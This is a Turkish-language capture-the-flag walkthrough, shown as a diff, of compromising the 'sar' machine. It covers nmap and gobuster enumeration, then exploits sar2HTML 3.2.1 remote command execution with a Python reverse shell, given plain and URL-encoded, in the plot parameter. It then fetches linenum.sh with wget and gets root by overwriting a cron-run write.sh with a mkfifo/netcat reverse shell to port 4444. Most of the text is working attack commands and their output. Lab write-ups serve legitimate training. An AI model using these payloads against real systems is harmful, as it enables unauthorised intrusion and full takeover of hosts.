@@ -1,0 +1,145 @@
+      ####Enumeration
+
+Nmap
+İlk 5000 TCP bağlantı noktasına karşı bir tarama yaparak başlıyoruz :
+kali@kali:~$ nmap -p- -T4 --top-ports=5000 $targetip
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 20:10 SAST
+Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 8.76% done; ETC: 20:12 (0:01:55 remaining)
+Warning: $targetip giving up on port because retransmission cap hit (6).
+Nmap scan report for $targetip
+Host is up (0.25s latency).
+Not shown: 4989 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+249/tcp   filtered unknown
+388/tcp   filtered unidata-ldm
+1023/tcp  filtered netvenuechat
+1406/tcp  filtered netlabs-lm
+1630/tcp  filtered oraclenet8cman
+1818/tcp  filtered etftp
+9290/tcp  filtered unknown
+20226/tcp filtered unknown
+58838/tcp filtered unknown
+
+      ####GoBuster
+Apache'nin 80 numaralı bağlantı noktasında çalıştığını görüyoruz gobuster ve sunucudaki tüm genel dosya veya klasörleri bulmaya başlıyoruz.
+kali@kali:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 10 --url http://$targetip/      
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$targetip/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/13 20:23:22 Starting gobuster
+===============================================================
+GoBuster robots.txt dosyasını bulur ve curl kullanarak dosyanın içeriğini hızlı bir şekilde alabiliriz:
+kali@kali:~$ curl http://$targetip/robots.txt
+Robots.txt bizi /sar2HTML dizinine yönlendirir. Tarayıcımızda tam URL'yi ziyaret ederek sar2HTML uygulamasının sürümünü belirleyebiliriz: 3.2.1. Searchsploit'i kullanarak, bilinen tüm güvenlik açıkları için Exploit-DB'yi sorgularız.
+kali@kali:~$ searchsploit sar2html
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                          |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                               | php/webapps/47204.txt
+
+      ####Exploitation
+
+sar2HTML Uzaktan Kod Yürütme
+İlk olarak, netcat dinleyicimizi 443 numaralı bağlantı noktasına kuracağız:
+kali@kali:~$ sudo nc -lvp 443
+listening on [any] 443 ...
+Ters kabuğumuz için Python3 kullanacağız. Kurulumunuza uyacak şekilde IP adresini ve bağlantı noktası bilgilerini değiştirmemiz gerekiyor:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+Yükümüzü ilk olarak URL kodlaması yapmak her zaman iyi bir fikirdir:
+%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%31%31%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
+URL kodlu yükümüzle ve tarayıcımızı kullanarak savunmasız sayfayı ziyaret ediyoruz:
+$attackerip/sar2HTML/index.php?plot=;%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%31%31%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
+Yürütüldükten sonra, ters bir kabuk geri alırız.
+kali@kali:~$ sudo nc -lvp 443
+listening on [any] 443 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 47406
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@sar:/var/www/html/sar2HTML$ 
+
+
+      ####Local Enumeration
+İlk görevimiz, hedef makinemize bir Linux ayrıcalık yükseltme komut dosyası almak. Bu hedef için linenum.sh kullanacağız , 
+denetleyici komut dosyasını Python'un SimpleHTTP sunucusunu kullanarak saldıran makinemizde barındıracağız ve ardından wgethedef makineden kullanarak onu alacağız.
+kali@kali:~$ python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+www-data@sar:/var/www/html/sar2HTML$ cd /tmp
+cd /tmp
+www-data@sar:/tmp$ wget http://$attackerip:8000/linenum.sh
+wget http://$attackerip:8000/linenum.sh
+--2020-03-10 18:03:38--  http://$attackerip:8000/linenum.sh
+Connecting to $attackerip:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'linenum.sh'
+
+linenum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.08s   
+
+2020-03-10 18:03:38 (576 KB/s) - 'linenum.sh' saved [46631/46631]
+Hedef makinemizde ayrıcalık denetleyici komut dosyasına sahip olduğumuzda, komut dosyasının yürütülebilir olduğundan emin olmak için izinleri değiştirmemiz gerekir. Ardından betiği çalıştırabiliriz:
+www-data@sar:/tmp$ chmod 777 linenum.sh
+chmod 777 linenum.sh
+www-data@sar:/tmp$ ./linenum.sh
+Linux numaralandırma betiğinin sonuçlarını araştırırken, bir cronjob'ın her 5 dakikada bir nihayet.sh betiğini root olarak çalıştırdığını görüyoruz:
+...
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
+...
+
+      ####Root Shell
+finally.sh dosyasını inceleyerek , /tmp dizininde bir dosya oluşturan write.sh adlı başka bir dosyayı çalıştırdığını görüyoruz :
+www-data@sar:/var/www/html$ cat finally.sh
+cat finally.sh
+#!/bin/sh
+
+./write.sh
+www-data@sar:/var/www/html$ cat write.sh
+cat write.sh
+#!/bin/sh
+
+touch /tmp/gateway
+www-data@sar:/var/www/html$
+Bir kök kabuk elde etmek için write.sh'nin içeriğini yükümüzle değiştirebiliriz:
+www-data@sar:/var/www/html$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip 4444 >/tmp/f" > write.sh
+<h -i 2>&1|nc $attackerip 4444 >/tmp/f" > write.sh
+www-data@sar:/var/www/html$ cat write.sh
+cat write.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attackerip 4444 >/tmp/f
+www-data@sar:/var/www/html$
+4444 numaralı bağlantı noktasında bir netcat dinleyicisi ayarlayalım ve kök kabuğunu yakalayalım:
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+
+$attackerip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 43572
+/bin/sh: 0: can't access tty; job control turned off
+# # whoami
+root
+# 
